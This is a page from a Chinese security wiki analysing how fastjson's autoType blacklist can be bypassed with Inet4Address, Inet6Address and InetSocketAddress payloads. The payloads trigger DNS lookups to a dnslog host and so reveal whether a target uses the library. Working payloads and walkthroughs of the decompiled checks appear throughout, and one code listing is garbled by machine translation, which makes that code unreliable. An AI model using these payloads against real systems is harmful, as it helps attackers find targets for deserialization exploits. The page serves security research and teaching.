<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Fastjson/%E9%80%9A%E8%BF%87Dnslog%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8fastjson/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>通过Dnslog判断是否使用fastjson - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u901a\u8fc7Dnslog\u5224\u65ad\u662f\u5426\u4f7f\u7528fastjson", url: "#_top", children: [
              {title: "\u65b9\u6cd5\u4e00\uff1a\u5229\u7528java.net.Inet [4 | 6]\u5730\u5740", url: "#javanetinet-4-6" },
              {title: "\u65b9\u6cd5\u4e8c\uff1a\u5229\u7528java.net.InetSocketAddress", url: "#javanetinetsocketaddress" },
              {title: "\u65b9\u6cd5\u4e09\uff1a\u5229\u7528java.net.URL", url: "#javaneturl" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_1" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../1.2.24-rce/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../1.2.24-rce/" class="btn btn-xs btn-link">
        Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Fastjson%20%E5%A4%9A%E7%89%88%E6%9C%ACpayload%E9%9B%86%E5%90%88/" class="btn btn-xs btn-link">
        Fastjson 多版本payload集合
      </a>
    </div>
    
  </div>

    

    <h1 id="dnslogfastjson">通过Dnslog判断是否使用fastjson<a class="headerlink" href="#dnslogfastjson" title="Permanent link">&para;</a></h1>
<h2 id="javanetinet-4-6">方法一：利用java.net.Inet [4 | 6]地址<a class="headerlink" href="#javanetinet-4-6" title="Permanent link">&para;</a></h2>
<p>很早之前有一个方法是使用<code>java.net.InetAddress</code>类，现在这个类已经列入黑名单。而在翻阅fastjson最新版源码（<code>v1.2.67</code>）时，发现两个类没有在黑名单中，于是可以构造了如下有效载荷，可以使fastjson进行DNS解析。下面以<code>java.net.Inet4Address</code>为例分析构造原理。</p>
<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;java.net.Inet4Address&quot;</span><span class="p">,</span><span class="s">&quot;val&quot;</span><span class="p">:</span><span class="s">&quot;dnslog&quot;</span><span class="p">}</span>
<span class="p">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;java.net.Inet6Address&quot;</span><span class="p">,</span><span class="s">&quot;val&quot;</span><span class="p">:</span><span class="s">&quot;dnslog&quot;</span><span class="p">}</span>
</code></pre></div>

<p>我们知道在fastjson在反序列化之前都会调用<code>checkAutoType</code>方法对类进行检查。通过调试发现，由于<code>java.net.Inet4Address</code>不在黑名单中，所以就算开启AutoType也是能过<code>1</code>处的检查。</p>
<p>fastjson的ParserConfig类自己维护了一个<code>IdentityHashMap</code>，在这个HashMap中的类会被认为是安全的。在<code>2</code>处可以在IdentityHashMap中可以获取到<code>java.net.Inet4Address</code>，所以<code>clazz</code>不为<code>null</code>，导致在<code>3</code>处就返回了。跳过了后续的未开启<code>AutoType</code>的黑名单检查。所以可以发现无论<code>AutoType</code>是否开启，都可以过<code>checkAutoType</code>的检查</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="o">.</span><span class="n">parser</span><span class="o">.</span><span class="n">ParserConfig</span><span class="c1">#checkAutoType</span>
<span class="n">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;</span><span class="err">?</span><span class="o">&gt;</span><span class="w"> </span><span class="n">checkAutoType</span><span class="p">(</span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;</span><span class="err">?</span><span class="o">&gt;</span><span class="w"> </span><span class="n">expectClass</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">features</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">...</span>
<span class="w">    </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span>

<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mf">1.</span><span class="err">当打开了</span><span class="n">autoTypeSupport</span><span class="p">,</span><span class="err">类名又不在白名单时进行的黑名单检查</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">internalWhite</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">autoTypeSupport</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">expectClassFlag</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h3</span><span class="p">;</span>

<span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="n">mask</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">className</span><span class="o">.</span><span class="n">length</span><span class="p">();</span><span class="w"> </span><span class="o">++</span><span class="n">mask</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nb">hash</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="n">long</span><span class="p">)</span><span class="n">className</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">mask</span><span class="p">);</span>
<span class="w">            </span><span class="nb">hash</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="mi">1099511628211</span><span class="n">L</span><span class="p">;</span>
<span class="w">            </span><span class="o">....</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Arrays</span><span class="o">.</span><span class="n">binarySearch</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">denyHashCodes</span><span class="p">,</span><span class="w"> </span><span class="nb">hash</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">TypeUtils</span><span class="o">.</span><span class="n">getClassFromMapping</span><span class="p">(</span><span class="n">typeName</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">Arrays</span><span class="o">.</span><span class="n">binarySearch</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">acceptHashCodes</span><span class="p">,</span><span class="w"> </span><span class="n">fullHash</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s2">&quot;autoType is not support. &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>


<span class="w">    </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="o">.</span><span class="n">getClassFromMapping</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="mf">2.</span><span class="w"> </span><span class="n">fastjson的ParserConfig类自己维护了一个IdentityHashMap在这个HashMap中的类会被认为是安全的</span><span class="err">，会直接被返回。</span>
<span class="w">        </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">deserializers</span><span class="o">.</span><span class="n">findClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="p">)</span><span class="n">this</span><span class="o">.</span><span class="n">typeMapping</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">internalWhite</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="o">.</span><span class="n">loadClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">defaultClassLoader</span><span class="p">,</span><span class="w"> </span><span class="bp">true</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">expectClass</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">HashMap</span><span class="o">.</span><span class="k">class</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">expectClass</span><span class="o">.</span><span class="n">isAssignableFrom</span><span class="p">(</span><span class="n">clazz</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s2">&quot;type not match. &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot; -&gt; &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">expectClass</span><span class="o">.</span><span class="n">getName</span><span class="p">());</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="mf">3.</span><span class="w"> </span><span class="err">直接返回，不再走下面的</span><span class="n">autoTypeSupport和黑名单检查</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="mf">4.</span><span class="w"> </span><span class="err">不开启</span><span class="n">autoType时</span><span class="err">，进行的黑名单检查</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">autoTypeSupport</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nb">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">h3</span><span class="p">;</span>

<span class="w">            </span><span class="k">for</span><span class="p">(</span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="n">mask</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">className</span><span class="o">.</span><span class="n">length</span><span class="p">();</span><span class="w"> </span><span class="o">++</span><span class="n">mask</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nb">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">className</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">mask</span><span class="p">);</span>
<span class="w">                </span><span class="nb">hash</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="n">long</span><span class="p">)</span><span class="n">c</span><span class="p">;</span>
<span class="w">                </span><span class="nb">hash</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="mi">1099511628211</span><span class="n">L</span><span class="p">;</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Arrays</span><span class="o">.</span><span class="n">binarySearch</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">denyHashCodes</span><span class="p">,</span><span class="w"> </span><span class="nb">hash</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s2">&quot;autoType is not support. &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="o">...</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span><span class="w">    </span>
<span class="w">    </span><span class="o">...</span>
<span class="p">}</span>
</code></pre></div>

<p>fastjason对于<code>Inet4Address</code>类会使用<code>MiscCodec</code>这个<code>ObjectDeserializer</code>来反序列化。跟进发现解析器会取回val变量的值赋值给strVal变量，由于我们的类是Inet4Address，所以它们会执行到1处，进行域名解析。</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="o">.</span><span class="n">serializer</span><span class="o">.</span><span class="n">MiscCodec</span><span class="c1">#deserialze </span>
<span class="n">public</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">deserialze</span><span class="err">（</span><span class="n">DefaultJSONParser</span><span class="w"> </span><span class="n">parser</span><span class="err">，</span><span class="n">Type</span><span class="w"> </span><span class="n">clazz</span><span class="err">，</span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">fieldName</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">        </span><span class="o">...</span><span class="w"> </span>
<span class="w">        </span><span class="n">objVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parser</span><span class="o">.</span><span class="n">parse</span><span class="err">（）</span><span class="p">;</span><span class="w"> </span>
<span class="w">         </span><span class="o">...</span><span class="w"> </span>
<span class="w">        </span><span class="n">strVal</span><span class="w"> </span><span class="o">=</span><span class="err">（</span><span class="nb nb-Type">String</span><span class="err">）</span><span class="n">objVal</span><span class="p">;</span><span class="w"> </span>
<span class="w">        </span><span class="k">if</span><span class="err">（</span><span class="n">strVal</span><span class="err">！</span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">strVal</span><span class="o">.</span><span class="n">length</span><span class="err">（）！</span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">            </span><span class="k">if</span><span class="err">（</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">UUID</span><span class="o">.</span><span class="k">class</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">                </span><span class="o">...</span><span class="w"> </span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="err">（</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">URI</span><span class="o">.</span><span class="k">class</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">                </span><span class="o">...</span><span class="w"> </span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="err">（</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">URL</span><span class="o">.</span><span class="k">class</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">                </span><span class="o">...</span><span class="w"> </span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="err">（</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Pattern</span><span class="o">.</span><span class="k">class</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">                </span><span class="o">...</span><span class="w"> </span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="err">（</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Locale</span><span class="o">.</span><span class="k">class</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">                </span><span class="o">...</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="err">（</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SimpleDateFormat</span><span class="o">.</span><span class="k">class</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">                </span><span class="o">...</span><span class="w"> </span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="err">（</span><span class="n">clazz</span><span class="err">！</span><span class="o">=</span><span class="w"> </span><span class="n">InetAddress</span><span class="o">.</span><span class="k">class</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">clazz</span><span class="err">！</span><span class="o">=</span><span class="w"> </span><span class="n">Inet4Address</span><span class="o">.</span><span class="k">class</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">clazz</span><span class="err">！</span><span class="o">=</span><span class="w"> </span><span class="n">Inet6Address</span><span class="o">.</span><span class="k">class</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">                </span><span class="o">...</span><span class="w"> </span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
<span class="w">                </span><span class="err">试试</span><span class="p">{</span><span class="w"> </span>
<span class="w">                    </span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1.</span><span class="err">将</span><span class="n">strVal作为主机名</span><span class="err">，获取其对应的</span><span class="n">IP</span><span class="err">，域名在此处被解析</span>
<span class="w">                    </span><span class="err">返回</span><span class="n">InetAddress</span><span class="o">.</span><span class="n">getByName</span><span class="err">（</span><span class="n">strVal</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="err">（</span><span class="n">UnknownHostException</span><span class="w"> </span><span class="n">var11</span><span class="err">）</span><span class="p">{</span><span class="w"> </span>
<span class="w">                    </span><span class="err">抛出新的</span><span class="n">JSONException</span><span class="err">（“反序列化</span><span class="n">inet地址错误</span><span class="err">”，</span><span class="n">var11</span><span class="err">）</span><span class="p">;</span><span class="w"> </span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span>
<span class="w">        </span><span class="p">}</span><span class="err">其他</span><span class="p">{</span><span class="w"> </span>
<span class="w">            </span><span class="err">返回</span><span class="nb nb-Type">null</span><span class="p">;</span><span class="w"> </span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span>
<span class="p">}</span>
</code></pre></div>

<h2 id="javanetinetsocketaddress">方法二：利用java.net.InetSocketAddress<a class="headerlink" href="#javanetinetsocketaddress" title="Permanent link">&para;</a></h2>
<p><code>java.net.InetSocketAddress</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p>
<p>通过它要走到<code>InetAddress.getByName()</code>流程计量方法一是要绕过一些路的。刚开始一直没构造出来，后来在和实验室的<code>@背影</code>师傅交流时，才知道可以顺着解析器规则构造（<code>它要啥就给它啥</code>），最终有效载荷如下，当然它是畸形的json。</p>
<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="s">&quot;@type&quot;</span><span class="p">:</span><span class="s">&quot;java.net.InetSocketAddress&quot;</span><span class="p">{</span><span class="s">&quot;address&quot;</span><span class="p">:,</span><span class="s">&quot;val&quot;</span><span class="p">:</span><span class="s">&quot;dnslog&quot;</span><span class="p">}}</span>
</code></pre></div>

<p>那这个是怎样构造出来的呢？这需要简单了解下fastjson的词法分析器了，这里就不展开了。这里尤为关键的是解析器<code>token</code>值对应的含义，可以在<code>com.alibaba.fastjson.parser.JSONToken</code>类中看到它们。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">//com.alibaba.fastjson.parser.JSONToken</span>
<span class="n">public</span><span class="w"> </span><span class="n">class</span><span class="w"> </span><span class="n">JSONToken</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">...</span>
<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">(</span><span class="nb">int</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">switch</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;error&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;int&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;float&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;string&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;iso8601&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">6</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">7</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;false&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">8</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;null&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">9</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;new&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;(&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">11</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;)&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">12</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;{&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;}&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">14</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;[&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;]&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">16</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;,&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">17</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;:&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">18</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;ident&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">19</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;fieldName&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">20</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;EOF&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">21</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;Set&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;TreeSet&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">23</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;undefined&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">24</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;;&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">25</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;.&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">26</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;hex&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="n">default</span><span class="p">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;Unknown&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
